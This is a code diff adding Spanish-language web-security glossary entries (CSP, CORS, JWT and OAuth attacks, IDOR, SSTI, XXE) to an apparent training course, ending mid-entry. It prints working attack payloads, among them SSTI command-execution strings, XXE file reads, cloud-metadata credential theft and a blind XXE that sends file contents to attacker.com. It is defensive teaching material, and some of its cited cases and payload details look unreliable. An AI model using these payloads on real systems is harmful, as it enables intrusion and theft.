@@ -1610,6 +1610,150 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Headers de seguridad", "Cross-Site Request Forgery (CSRF)", "Cross-Site Scripting (XSS)"],
   },
+  {
+    id: 235,
+    module: 20,
+    term: "Content Security Policy (CSP) moderno",
+    short: "Whitelist declarativa de orígenes ejecutables — la defensa canónica contra XSS. Nonce + strict-dynamic es el gold standard 2025.",
+    detail:
+      "La **CSP** le dice al navegador **qué recursos puede cargar/ejecutar** cada página. Es el control primario contra XSS reflected/stored/DOM.\n" +
+      "\n**Evolución:**\n" +
+      "| Nivel | Enfoque | Debilidad |\n" +
+      "|---|---|---|\n" +
+      "| CSP 1.0 (2012) | Whitelist de hosts (`script-src cdn.com`) | Bypass por JSONP, gadgets AngularJS |\n" +
+      "| CSP 2.0 | Añade `nonce-*` y `sha256-*` | Correcto pero cascada rota si se pierde nonce |\n" +
+      "| **CSP 3.0** (2024) | **`nonce` + `strict-dynamic`** | Menos bypasses documentados |\n" +
+      "| **Trusted Types** | Fuerza que asignaciones DOM peligrosas (`innerHTML`) pasen por una policy | Cierra DOM XSS |\n" +
+      "\n**El gold standard hoy:**\n" +
+      "```\nContent-Security-Policy:\n  script-src 'nonce-r4nd0m' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n  require-trusted-types-for 'script';\n```\n" +
+      "\n**Bypasses clásicos que evitar:**\n" +
+      "• Whitelist con **JSONP endpoints** (`cdnjs`, `googleapis`): el atacante llama `?callback=alert` → RCE.\n" +
+      "• `data:` / `blob:` en `script-src` (permite `<script src=\"data:,alert(1)\">`).\n" +
+      "• Falta de `base-uri`: `<base href=\"//evil\">` reescribe URLs relativas.\n" +
+      "• Falta de `object-src 'none'`: `<object>` / `<embed>` con Flash/PDF.\n" +
+      "> 💡 **Google usa CSP con Trusted Types en gmail, YouTube y Docs**; corta el 99% de XSS DOM antes de que ejecute.\n" +
+      "> ⚠️ CSP en `Content-Security-Policy-Report-Only` primero para tunear, luego enforce. Nunca desplegar CSP directamente en prod sin telemetría.",
+    examples: [
+      "GitHub 2016: eliminó inline scripts + adoptó nonce-based CSP y cayó su tasa de XSS.",
+      "Trusted Types en aplicación React: forzar que `dangerouslySetInnerHTML` pase por policy.",
+      "Report-only rollout: `report-uri /csp-log` durante 2 semanas antes del enforce.",
+    ],
+    related: ["Cross-Site Scripting (XSS)", "Headers de seguridad", "Same-Site cookies y CSRF sin token", "DOM-based XSS y sinks modernos"],
+  },
+  {
+    id: 236,
+    module: 20,
+    term: "Same-Site cookies y CSRF sin token",
+    short: "El atributo SameSite convierte al navegador en el defensor primario contra CSRF, obsoletando los tokens en la mayoría de casos.",
+    detail:
+      "El atributo **`SameSite`** de cookies define si el navegador las envía en requests **cross-site**:\n" +
+      "\n| Valor | Envío en cross-site | Uso típico |\n" +
+      "|---|---|---|\n" +
+      "| `Strict` | Nunca | Cookies de auth super sensibles (banca) |\n" +
+      "| `Lax` (default 2020+) | Solo en top-level navigations GET | Default sano para 99% de cookies |\n" +
+      "| `None` + `Secure` | Sí, requiere HTTPS | Cookies de embeds cross-origin |\n" +
+      "\n**Chrome cambió el default a `Lax` en 2020** (Firefox y Edge siguieron). Impacto: CSRF con `POST` ya no funciona vía formulario cross-site — la cookie de sesión **no viaja**.\n" +
+      "\n**Contexto histórico:** antes se usaban **CSRF tokens** en cada form. Hoy siguen recomendados como defensa en profundidad, pero SameSite=Lax cierra la superficie primaria.\n" +
+      "\n**Bypasses de SameSite que hay que conocer:**\n" +
+      "• **Subdominios propios** — `SameSite` es *same-site*, no *same-origin*. Un XSS en `blog.miapp.com` puede hacer requests con cookies a `api.miapp.com`.\n" +
+      "• **Top-level GET** — un link phishing `<a href=\"https://banco.com/transfer?to=evil\">click aquí</a>` sí incluye la cookie con `Lax`. Fix: acciones sensibles solo por POST.\n" +
+      "• **Lax + 2 minutes grace period** (Chrome): en los primeros 2 min tras crear la cookie, se comporta como `None`. Explotable en OAuth flows.\n" +
+      "> 💡 La regla moderna: `Secure; HttpOnly; SameSite=Lax` como default; `Strict` para las super sensibles; `None; Secure` solo si realmente hay embedding cross-origin justificado.\n" +
+      "> ⚠️ El atributo `__Host-` prefix (Chrome) fuerza `Secure` + `Path=/` + sin `Domain=` — cierra fixation attacks vía subdominios.",
+    examples: [
+      "Migración a SameSite=Lax: eliminó CSRF por POST-form del pentesting normal en 2020.",
+      "OAuth flow con SameSite=Lax: pass. Con Strict: fallaría porque el redirect es cross-site.",
+      "`Set-Cookie: __Host-session=X; Secure; HttpOnly; SameSite=Strict; Path=/`",
+    ],
+    related: ["Cross-Site Request Forgery (CSRF)", "Content Security Policy (CSP) moderno", "Headers de seguridad", "CORS y preflight abuse"],
+  },
+  {
+    id: 237,
+    module: 20,
+    term: "CORS y preflight abuse",
+    short: "Access-Control-Allow-Credentials: true + Origin reflejado sin whitelist es RCE en tu API disfrazado de misconfiguration.",
+    detail:
+      "El **CORS** (Cross-Origin Resource Sharing) relaja la Same-Origin Policy para permitir que un origen A haga requests a un origen B. Es la puerta entre `app.com` y `api.app.com`. Mal configurada, es un **backdoor de exfiltración**.\n" +
+      "\n**Headers clave:**\n" +
+      "| Header | Función | Peligro |\n" +
+      "|---|---|---|\n" +
+      "| `Access-Control-Allow-Origin` | Qué origen puede leer la response | Reflejar `Origin` sin whitelist = cualquiera |\n" +
+      "| `Access-Control-Allow-Credentials: true` | Permite mandar cookies/auth | Combinado con reflejo de Origin = catastrófico |\n" +
+      "| `Access-Control-Allow-Methods` | Métodos permitidos (GET, POST, ...) | Amplio = fácil de abusar |\n" +
+      "| `Access-Control-Allow-Headers` | Headers custom permitidos | Amplio = injection lateral |\n" +
+      "\n**Anti-patrones de misconfiguration:**\n" +
+      "```\n// FATAL: cualquier origen puede leer con cookies\nAccess-Control-Allow-Origin: <reflejo del Origin del request>\nAccess-Control-Allow-Credentials: true\n\n// Peligroso: null origin (viene de <iframe sandbox>, data:, file://)\nAccess-Control-Allow-Origin: null  // \"null\" es una string válida\n\n// Wildcard con creds — el browser lo rechaza, pero el server lo declara mal\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true  // Contradictorio\n```\n" +
+      "\n**Preflight (`OPTIONS`)** — antes de PUT/DELETE/custom-header requests, el browser hace un `OPTIONS` primero. Muchas apps tratan el OPTIONS diferente (skip auth), lo que abre vectores.\n" +
+      "> 💡 **Test rápido:** manda un request con `Origin: https://evil.com` — si la response tiene `Access-Control-Allow-Origin: https://evil.com`, la config refleja y es explotable.\n" +
+      "> ⚠️ Casos reales: bugs en Facebook, Twitter, Bitbucket, GitHub — todos por CORS mal configurado leaked auth tokens en 2016-2020.",
+    examples: [
+      "PortSwigger: bounty de $10K en un CORS con `Origin` reflejado + credentials=true.",
+      "Whitelist estricta: comparar `Origin` contra `['https://app.com', 'https://app.mobile']` exacto.",
+      "GitHub Enterprise 2020: CVE-2020-10516 — CORS reflection leaked API tokens.",
+    ],
+    related: ["Same-Site cookies y CSRF sin token", "Headers de seguridad", "Cross-Site Request Forgery (CSRF)", "JWT attacks: alg=none, key confusion, weak secret"],
+  },
+  {
+    id: 238,
+    module: 20,
+    term: "HSTS, HPKP y downgrade attacks",
+    short: "HSTS previene el TLS strip; HPKP quedó deprecado por lock-out; ambos son parte del hardening de headers.",
+    detail:
+      "**HSTS** (*HTTP Strict Transport Security*) le dice al navegador: *'con este dominio, siempre usá HTTPS'* aunque el usuario tipee `http://`. Corta el ataque **SSL Strip** (Moxie Marlinspike, 2009): un MITM que reescribe redirects HTTPS→HTTP.\n" +
+      "\n**Header canónico:**\n" +
+      "```\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n" +
+      "\n**Componentes:**\n" +
+      "| Directiva | Efecto |\n" +
+      "|---|---|\n" +
+      "| `max-age=N` | El browser recuerda por N segundos que el dominio es HTTPS-only |\n" +
+      "| `includeSubDomains` | Aplica a *.tudominio.com también |\n" +
+      "| `preload` | Solicita inclusión en la **HSTS Preload List** de Chrome/Firefox — el browser sabe antes del primer visit |\n" +
+      "\n**HSTS Preload List** — https://hstspreload.org/ mantiene una lista incluida en Chromium; cualquier navegador basado en Chromium (Chrome, Edge, Brave, Opera) sabe de tu dominio antes de que lo visite. Enviar preload es prácticamente **irreversible** (delays de meses).\n" +
+      "\n**HPKP** (*HTTP Public Key Pinning*) — deprecado en 2018. Idea: pinar el hash de tu cert público en el browser. Problema: si tu CA cambiaba o perdías la clave privada del pin, quedabas **bloqueado meses**. Reemplazado por **Certificate Transparency + Expect-CT** (también deprecado 2022) y hoy por SCT extension nativa en el cert.\n" +
+      "\n**Downgrade attacks todavía existen:**\n" +
+      "• **SSL Strip 2** (2013) — bypass de HSTS con dominios sin preload en la primera visita.\n" +
+      "• **DROWN** (2016) — server con SSLv2 permite crackear TLS moderno del mismo cert.\n" +
+      "• **POODLE** (2014) — force downgrade a SSLv3, oracle en padding CBC.\n" +
+      "> 💡 Nunca uses HTTP redirect a HTTPS **sin HSTS**. Sin HSTS, un MITM intercepta el HTTP inicial y hace strip.\n" +
+      "> ⚠️ `max-age=0` desregistra HSTS. Útil para rollback controlado; peligroso si accidentalmente lo mandás en prod.",
+    examples: [
+      "Migración de max-age=31536000 (1 año) desde max-age=0: rollout progresivo.",
+      "Preload: agregar `preload` al header + submit a hstspreload.org.",
+      "Test con `curl -I https://tudominio.com | grep -i hsts` para verificar.",
+    ],
+    related: ["Headers de seguridad", "Content Security Policy (CSP) moderno", "Subresource Integrity (SRI)", "Same-Site cookies y CSRF sin token"],
+  },
+  {
+    id: 239,
+    module: 20,
+    term: "Subresource Integrity (SRI)",
+    short: "Un hash criptográfico en <script src=...> asegura que el CDN no sirvió una versión modificada. Defensa contra compromiso de CDN.",
+    detail:
+      "Cuando cargás un script desde un CDN (`unpkg`, `jsdelivr`, `cdnjs`), el navegador **confía** en el CDN. Si el CDN es comprometido (BGP hijack, cuenta admin robada), sirve un JS malicioso y **todas** las webs que lo consumen quedan comprometidas.\n" +
+      "\n**SRI** (Subresource Integrity, W3C) fuerza al navegador a **verificar el hash** del recurso:\n" +
+      "```html\n<script src=\"https://cdn.example.com/lib.js\"\n  integrity=\"sha384-abc123...\"\n  crossorigin=\"anonymous\">\n</script>\n```\n" +
+      "Si el hash no coincide, **el navegador rechaza el recurso**. El CDN puede servir lo que quiera; el browser no ejecuta.\n" +
+      "\n**Formato del hash:**\n" +
+      "• Algoritmos: `sha256`, `sha384`, `sha512` (SHA-1 y MD5 deprecados).\n" +
+      "• Múltiples permitidos: `integrity=\"sha384-hash1 sha384-hash2\"` para rollout.\n" +
+      "• Generación: `openssl dgst -sha384 -binary file.js | openssl base64 -A`.\n" +
+      "\n**Requisito CORS:** SRI requiere `crossorigin=\"anonymous\"` — el CDN debe habilitar CORS para el request. Sin CORS, el browser no puede verificar y bloquea silenciosamente.\n" +
+      "\n**Casos donde SRI ayuda:**\n" +
+      "• **CDN comprometido** — el hash cambia, browser rechaza.\n" +
+      "• **BGP hijack** — el atacante sirve otro contenido, browser rechaza.\n" +
+      "• **CDN quebró** — hash no matchea (cambio de versión sin update), browser rechaza. Rompe la app, pero de forma segura.\n" +
+      "\n**Casos donde SRI NO ayuda:**\n" +
+      "• **Repositorio del CDN comprometido en origen** — si el atacante actualiza la lib con backdoor Y todos los consumidores bajan el nuevo hash sin auditar.\n" +
+      "• **Attacker controls el HTML** — si hay XSS, el atacante inyecta su propio `<script>` sin SRI.\n" +
+      "> 💡 En 2018 el compromiso de la lib `event-stream` (npm) inyectó un stealer de Bitcoin. SRI no lo habría prevenido — el hash del atacante era válido. **La supply chain moderna requiere provenance + SRI + audit.**\n" +
+      "> ⚠️ Frameworks modernos (webpack, Vite) generan SRI automático para chunks. Verificar que el build los emita.",
+    examples: [
+      "Bootstrap CDN: `<link rel=\"stylesheet\" href=\"...\" integrity=\"sha384-...\" crossorigin=\"anonymous\">`.",
+      "Auditoría: `grep -r '<script src=\"https://' | grep -v integrity=` — encontrar scripts sin SRI.",
+      "Auto-generación con webpack-subresource-integrity plugin.",
+    ],
+    related: ["Content Security Policy (CSP) moderno", "Dependency scanning (SCA)", "Supply chain de imágenes (cosign / Sigstore / SLSA)", "HSTS, HPKP y downgrade attacks"],
+  },
 
   // ── M21 · OWASP Top 10 (Parte 1) ─────────────────────────────────────────
   {
@@ -1683,6 +1827,187 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Hardening y CIS Benchmarks", "Headers de seguridad", "OWASP Top 10"],
   },
+  {
+    id: 245,
+    module: 21,
+    term: "JWT attacks: alg=none, key confusion, weak secret",
+    short: "El header alg del JWT es un vector de escalada. alg=none, HS256↔RS256 confusion y HMAC con secret débil son las 3 clásicas.",
+    detail:
+      "Un **JWT** (JSON Web Token) es `header.payload.signature` en base64url. El header declara `alg` (algoritmo de firma). Si el servidor **no valida rigurosamente el alg**, hay escalada trivial:\n" +
+      "\n**1. `alg: 'none'` — la firma se ignora**\n" +
+      "```json\n// Header\n{ \"alg\": \"none\", \"typ\": \"JWT\" }\n// Payload\n{ \"sub\": \"admin\", \"role\": \"admin\" }\n// Signature: vacía\n```\n" +
+      "Se envía sin firma; librerías viejas aceptan. Fix: whitelist explícita de algs.\n" +
+      "\n**2. Key confusion: HS256 ↔ RS256**\n" +
+      "El servidor espera **RS256** (asimétrico, verifica con clave pública). El atacante toma la **clave pública** (que suele ser pública, ¡obvio!) y firma con **HS256** (HMAC simétrico) usándola como secret. Si el servidor no verifica el alg antes de decidir la key, valida con HMAC(publica) = OK.\n" +
+      "\n**3. HMAC con secret débil (HS256)**\n" +
+      "El servidor firma con HS256 usando un secret. Si el secret es `secret`, `password123`, `jwt_secret`, `changeme`, el atacante lo crackea offline con **hashcat mode 16500**:\n" +
+      "```\nhashcat -a 0 -m 16500 jwt.txt rockyou.txt\n```\n" +
+      "Con el secret, forja tokens arbitrarios.\n" +
+      "\n**4. `kid` injection**\n" +
+      "Algunos JWTs incluyen `kid` (key id) en el header, que la app usa para buscar la clave. Si es reflejado en un query DB o path, → SQLi / path traversal / RCE.\n" +
+      "\n**5. `jku` / `x5u` — remote key**\n" +
+      "El header puede apuntar a una URL de la clave (`jku`). Si el server la baja sin whitelist, el atacante hostea su propia clave y firma.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Whitelist de algs**: `if (alg !== 'RS256') reject`.\n" +
+      "• **Secrets fuertes** de ≥256 bits, generados aleatoriamente.\n" +
+      "• **Whitelist de jku/x5u** URLs.\n" +
+      "• Preferir **PASETO** o **JWT alternativos** (Branca, Fernet) que no tienen esta superficie.\n" +
+      "> 💡 **jwt.io** te decodifica y firma con tu secret guessed — herramienta indispensable en pentests.\n" +
+      "> ⚠️ Case: Auth0, Firebase Auth, y varios frameworks tuvieron CVEs de key confusion 2017-2020.",
+    examples: [
+      "Auth0 CVE-2020-28460: HS256/RS256 confusion en algunas configs.",
+      "hashcat crackea `secret` en <1s con rockyou.txt.",
+      "Herramientas: jwt_tool.py, PortSwigger's JWT Editor extension.",
+    ],
+    related: ["OWASP Top 10", "OAuth 2.0 flow attacks (redirect_uri, PKCE bypass)", "AAA (Autenticación, Autorización, Accounting)", "MFA y autenticación moderna"],
+  },
+  {
+    id: 246,
+    module: 21,
+    term: "OAuth 2.0 flow attacks (redirect_uri, PKCE bypass)",
+    short: "OAuth es un protocolo de autorización complejo con vectores heredados; open redirect en redirect_uri, PKCE bypass y state absent son los top 3.",
+    detail:
+      "**OAuth 2.0** delega **autorización** a un IdP (Google, GitHub, Auth0). El *authorization code flow* moderno es el estándar. Cada paso tiene su vector.\n" +
+      "\n**Vector 1: `redirect_uri` open redirect**\n" +
+      "El client registra un `redirect_uri` en el IdP. Si la validación acepta:\n" +
+      "• `https://miapp.com/callback` (correcto) → OK.\n" +
+      "• `https://miapp.com.evil.com/callback` (subdominio manipulado) → si el IdP usa `startsWith` sin normalizar, acepta.\n" +
+      "• `https://miapp.com/callback?next=//evil.com` (open redirect en la app) → chain: auth code enviado a atacante.\n" +
+      "**Fix**: exact-match del `redirect_uri` completo.\n" +
+      "\n**Vector 2: sin `state` = CSRF**\n" +
+      "El `state` es un token opaco que el client genera antes del redirect y verifica al callback. Sin él, el atacante puede **loguear a la víctima con su cuenta** (session fixation) o hacer accept-only-my-code attacks. Debe ser: aleatorio, ligado a la sesión, verificado al retorno.\n" +
+      "\n**Vector 3: PKCE bypass (SPAs y mobile)**\n" +
+      "**PKCE** (*Proof Key for Code Exchange*, RFC 7636) fue creado para clients públicos (SPA, mobile) que no pueden guardar un client_secret. Genera un `code_verifier` random + `code_challenge = sha256(verifier)`.\n" +
+      "• El auth request incluye `code_challenge`.\n" +
+      "• El token request incluye `code_verifier` (el IdP compara).\n" +
+      "\n**Bypasses de PKCE:**\n" +
+      "• `code_challenge_method=plain` — se manda el verifier tal cual como challenge. Si un MITM intercepta el request, roba y usa. Fix: forzar `S256`.\n" +
+      "• IdP que **acepta requests sin code_verifier** para el flow que también acepta PKCE (fallback silencioso). Fix: rechazar si PKCE fue iniciado y no completado.\n" +
+      "\n**Vector 4: Implicit flow (deprecado)**\n" +
+      "Antes de PKCE, SPAs usaban *implicit flow* — el access_token venía en el fragment de URL. Filtraciones vía Referer, extensiones, service workers. Hoy prohibido por OAuth 2.1.\n" +
+      "\n**Vector 5: Refresh token infinito**\n" +
+      "Si el refresh token no rota y no expira, un roll perdido = acceso perpetuo. Fix: **refresh token rotation** + detection de reuse (revoca la familia entera).\n" +
+      "> 💡 **OAuth 2.1** (draft) consolida best practices: PKCE obligatorio, exact redirect_uri, sin implicit, rotación de refresh.\n" +
+      "> ⚠️ Caso real: **Grammarly 2019** — vulnerabilidad de OAuth permitió a un attacker sitio robar tokens de millones de usuarios (redirect_uri mal validado).",
+    examples: [
+      "Grammarly 2019 CVE: redirect_uri con subdominio malicioso aceptado.",
+      "Rotación de refresh token: revocar toda la familia si detecta reuse.",
+      "Herramienta: EchoGrab, Burp Extension oauth_scan.",
+    ],
+    related: ["JWT attacks: alg=none, key confusion, weak secret", "OWASP Top 10", "Cross-Site Request Forgery (CSRF)", "Consent phishing (illicit OAuth grant)"],
+  },
+  {
+    id: 247,
+    module: 21,
+    term: "BOLA / IDOR y Broken Object Level Auth",
+    short: "El bug #1 de APIs modernas: /api/users/123 devuelve el objeto sin verificar que 123 pertenezca al caller.",
+    detail:
+      "**BOLA** (*Broken Object Level Authorization*) es **#1 en OWASP API Top 10** (2023). Sinónimo del clásico **IDOR** (*Insecure Direct Object Reference*). El bug es simple: el endpoint recibe un `id` en URL/body y devuelve el objeto **sin verificar que el usuario tenga derecho**.\n" +
+      "\n**Ejemplo canónico:**\n" +
+      "```\nGET /api/orders/12345\n// Server: SELECT * FROM orders WHERE id=12345;\n// Falta: AND user_id = $current_user\n```\n" +
+      "Cualquier usuario autenticado ve pedidos de todos los demás.\n" +
+      "\n**Variantes:**\n" +
+      "| Tipo | Vector |\n" +
+      "|---|---|\n" +
+      "| **Numeric IDOR** | IDs secuenciales (`/orders/12345` → `12344`, `12346`) |\n" +
+      "| **UUID IDOR** | UUID no aleatorio (v1 basado en MAC + tiempo) o filtrado en respuesta |\n" +
+      "| **Path IDOR** | `/api/tenants/mine` vs `/api/tenants/{otro-tenant}/data` |\n" +
+      "| **Verb tampering** | GET permitido, POST/PUT/DELETE no verificados |\n" +
+      "| **Mass assignment** | PATCH con `{\"role\": \"admin\"}` en body → escala si el server no whitelistea fields |\n" +
+      "\n**Detección:**\n" +
+      "• Escaneo automatizado no ayuda mucho — requiere entender el contexto de negocio.\n" +
+      "• **Burp Autorize / AuthMatrix** — envían cada request con las cookies de otro user, comparan responses.\n" +
+      "• Fuzzing de IDs adyacentes y monitoreo de éxito.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Authorization en cada endpoint** — no confiar en 'está autenticado, listo'.\n" +
+      "• Preferir **UUIDs v4 aleatorios** en URLs (dificulta enumeración, aunque no autoriza).\n" +
+      "• **Row-level security** en DB (Postgres RLS, Supabase RLS) — la DB filtra por `auth.uid()`.\n" +
+      "• **API Gateway policies** de authorization declarativa.\n" +
+      "> 💡 Alan Beckley (Facebook 2013): pagó por probar que él era otro user. Cada botón del UI accedía a IDs adyacentes de otros users. $10K bounty por 1 hora de work.\n" +
+      "> ⚠️ **BOLA es dominante en APIs GraphQL** — el atacante enumera todos los tipos con introspection y hace queries a IDs arbitrarios. Deshabilitar introspection en prod es solo el primer paso.",
+    examples: [
+      "Uber 2016: bug de IDOR permitía cancelar rides de otros users.",
+      "Row-level security en Supabase: `USING (user_id = auth.uid())` en policy RLS.",
+      "Facebook 2013: cualquier user id accedía a datos de otros vía APIs mal autorizadas.",
+    ],
+    related: ["OWASP Top 10", "Modelos de autorización", "Principio de mínimo privilegio", "AAA (Autenticación, Autorización, Accounting)"],
+  },
+  {
+    id: 248,
+    module: 21,
+    term: "Business logic vulnerabilities",
+    short: "El código funciona, cada request pasa validación — pero la combinación permite fraude. Requiere entender el negocio, no solo la stack.",
+    detail:
+      "Las **business logic vulns** no son bugs de código sino **de diseño**. Cada request individualmente es válido, pero la **secuencia** o **combinación** rompe la lógica del negocio. No las encuentra ningún scanner: requieren entender el flujo.\n" +
+      "\n**Categorías clásicas:**\n" +
+      "\n**1. Race conditions (TOCTOU en el checkout)**\n" +
+      "```\nStep 1: Aplicar código descuento 50%OFF (checked once) → precio 5€\nStep 2: Múltiples requests paralelos de 'apply-coupon' → aplica 50% varias veces → precio 0€ o negativo\n```\n" +
+      "Fix: locks pesimistas, idempotency keys, verificar que el precio final coincida.\n" +
+      "\n**2. Cambio de rol via multi-step flow**\n" +
+      "```\nStep 1: Solicitar signup como user → OK\nStep 2: Verificar email (JWT no incluye role)\nStep 3: Enviar profile con {role: 'admin'} → server acepta (mass assignment)\n```\n" +
+      "\n**3. Coupon abuse**\n" +
+      "```\n- Códigos que no expiran cuando debían.\n- Un código NEWUSER10 usado por el mismo user 100 veces.\n- Códigos derivables (WELCOME10 → WELCOME15, WELCOME20).\n- Combinación de códigos no permitida por diseño pero server acepta.\n```\n" +
+      "\n**4. Free-tier abuse**\n" +
+      "```\n- Registrar cuentas infinitas con `+alias` en gmail (foo+1@, foo+2@).\n- El sistema NO normaliza el email antes de checkear duplicados.\n- Cada cuenta obtiene crédito free → costo real para la empresa.\n```\n" +
+      "\n**5. Workflow bypass**\n" +
+      "```\n/purchase → /payment → /confirmation → order_placed=true\nAtacante hace directo → /confirmation (skip payment) → order_placed=true si no valida flujo.\n```\n" +
+      "\n**Casos famosos:**\n" +
+      "• **Starbucks 2015** — race condition en gift cards permitió transferencia doble.\n" +
+      "• **Instacart 2020** — códigos de refund reutilizables.\n" +
+      "• **Airbnb 2019** — bypass de proceso de refund via API directa.\n" +
+      "\n**Testing:**\n" +
+      "• **Threat modeling** del flujo antes que fuzzer.\n" +
+      "• **Race conditions**: Burp Turbo Intruder para envíos paralelos.\n" +
+      "• **State machine analysis**: mapear estados válidos y probar transiciones inválidas.\n" +
+      "> 💡 **PortSwigger Academy** tiene labs excelentes de business logic — nada reemplaza pensar como un fraudster.\n" +
+      "> ⚠️ Estos bugs son **hard to detect** en producción: los logs muestran 'todo OK' porque cada request individualmente lo era.",
+    examples: [
+      "Turbo Intruder para race condition: 100 requests paralelos con `--filter '=200'`.",
+      "Threat model: mapear estados del checkout y probar cada transición inválida.",
+      "Instacart 2020: refunds reutilizables por lógica de negocio, no XSS/SQLi.",
+    ],
+    related: ["OWASP Top 10", "BOLA / IDOR y Broken Object Level Auth", "Ataques a MFA", "Insecure Design y Security Misconfiguration"],
+  },
+  {
+    id: 249,
+    module: 21,
+    term: "Server-Side Template Injection (SSTI)",
+    short: "Un template engine (Jinja2, Twig, ERB) que evalúa input del usuario permite RCE en el servidor.",
+    detail:
+      "**SSTI** ocurre cuando la app pasa **input del usuario a un template engine** que lo interpreta como código. El engine tiene acceso a objetos internos (Python, Ruby, Node) → escalada a **RCE**.\n" +
+      "\n**Detección — payloads de diagnóstico:**\n" +
+      "| Payload | Engine | Response |\n" +
+      "|---|---|---|\n" +
+      "| `{{7*7}}` | Jinja2, Twig, Freemarker | `49` |\n" +
+      "| `${7*7}` | Freemarker, JSP EL | `49` |\n" +
+      "| `<%= 7*7 %>` | ERB (Ruby) | `49` |\n" +
+      "| `#{7*7}` | Slim, Ruby | `49` |\n" +
+      "| `${{7*7}}` | Handlebars | `{7*7}` (no evalúa) |\n" +
+      "\n**Explotación por engine:**\n" +
+      "\n**Jinja2 (Python)** — el clásico. `{{}}` evalúa expresiones:\n" +
+      "```python\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n// Enumera subclasses; buscar `Popen` → ejecutar comandos\n{{ config.__class__.__init_subclasses__.__self__.subclasses()[100]('id', shell=True, stdout=-1).communicate() }}\n```\n" +
+      "\n**Twig (PHP)**:\n" +
+      "```\n{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}\n```\n" +
+      "\n**Freemarker (Java)**:\n" +
+      "```\n<#assign x=\"freemarker.template.utility.Execute\"?new()>${ x(\"id\") }\n```\n" +
+      "\n**Casos reales:**\n" +
+      "• **Uber 2016** — Jinja2 SSTI en un dashboard interno → RCE en servidor de prod.\n" +
+      "• **PayPal 2016** — SSTI en Java Freemarker.\n" +
+      "• **CVE-2022-42889 (Text4Shell)** — Apache Commons Text con `${prefix:name}` interpretado como SSTI.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Nunca pasar input al template como código** — usar templates *parametrizados* (contexto que se sustituye, no evalúa).\n" +
+      "• **Sandbox del engine** — `SandboxedEnvironment` en Jinja2, `ConfigurableTemplateResolver` en Thymeleaf.\n" +
+      "• **Auditoría de sink**: buscar `render_template_string(user_input)`, `Template.new(user_input).render()`.\n" +
+      "• **CSP** no ayuda — SSTI es server-side.\n" +
+      "> 💡 **Portswigger's SSTI mapa** es la referencia — cubre engines y payloads.\n" +
+      "> ⚠️ **Server-side ≠ client-side template**. Angular / React tienen bugs de template injection también pero son XSS (cliente).",
+    examples: [
+      "Uber 2016: SSTI en Jinja2 escaló a RCE via `__mro__` enumeration.",
+      "Text4Shell CVE-2022-42889: input con `${script:javascript:...}` → RCE.",
+      "SandboxedEnvironment en Jinja2 limita atributos permitidos.",
+    ],
+    related: ["OWASP Top 10", "Cross-Site Scripting (XSS)", "Log4Shell y JNDI injection", "Insecure Design y Security Misconfiguration"],
+  },
 
   // ── M22 · OWASP Top 10 (Parte 2) ─────────────────────────────────────────
   {
@@ -1753,6 +2078,213 @@ export const DEFINITIONS: ConceptDefinition[] = [
       "Escanear servicios internos desde el servidor vulnerable.",
     ],
     related: ["SSRF y metadata cloud", "OWASP Top 10", "Headers de seguridad"],
+  },
+  {
+    id: 255,
+    module: 22,
+    term: "XML External Entity (XXE)",
+    short: "Un parser XML que resuelve entidades externas permite SSRF, file disclosure y DoS. Log4Shell primo mayor.",
+    detail:
+      "**XXE** ocurre cuando un parser XML acepta entradas del usuario y **procesa entidades externas** (`<!ENTITY x SYSTEM \"...\">`) sin restringir. La entidad puede apuntar a un archivo local, URL interna o generar loops de expansión.\n" +
+      "\n**Payload clásico — file disclosure:**\n" +
+      "```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>\n```\n" +
+      "El parser lee `/etc/passwd` y lo incluye en el response.\n" +
+      "\n**Payload — SSRF a metadata cloud:**\n" +
+      "```xml\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">\n```\n" +
+      "Roba credenciales IAM de una EC2 sin necesitar un SSRF explícito en la app.\n" +
+      "\n**Blind XXE — cuando la response no refleja:**\n" +
+      "```xml\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n```\n" +
+      "El `evil.dtd` en el servidor del atacante:\n" +
+      "```xml\n<!ENTITY % exfil \"<!ENTITY &#37; send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%exfil;\n%send;\n```\n" +
+      "El parser resuelve %file → lo manda al server del atacante. Out-of-band exfil.\n" +
+      "\n**DoS: billion laughs (XML bomb):**\n" +
+      "```xml\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!-- ... hasta lol9: 10^9 entradas -->\n```\n" +
+      "OOM en segundos.\n" +
+      "\n**Casos históricos:**\n" +
+      "• **Facebook 2014** — XXE en el importer de OpenID XML ganó $30K bounty.\n" +
+      "• **Google 2014** — XXE en la app de Toolbar's XML parser.\n" +
+      "• **SharePoint (múltiples CVEs 2016-2019)**.\n" +
+      "• **XmlRpcServer** en Java, PHP SimpleXML si `LIBXML_NOENT` activado.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Deshabilitar external entities** en el parser: `XMLInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false)` (Java), `libxml_disable_entity_loader(true)` (PHP <8), `defusedxml` (Python).\n" +
+      "• **Preferir JSON** o formatos sin DTD.\n" +
+      "• **WAF con detect de `<!DOCTYPE`** en request body.\n" +
+      "> 💡 XML sigue ubicuo: SOAP, SAML, RSS, DOCX/XLSX, PDF, PostgreSQL XML columns. Cualquier parser XML es candidato.\n" +
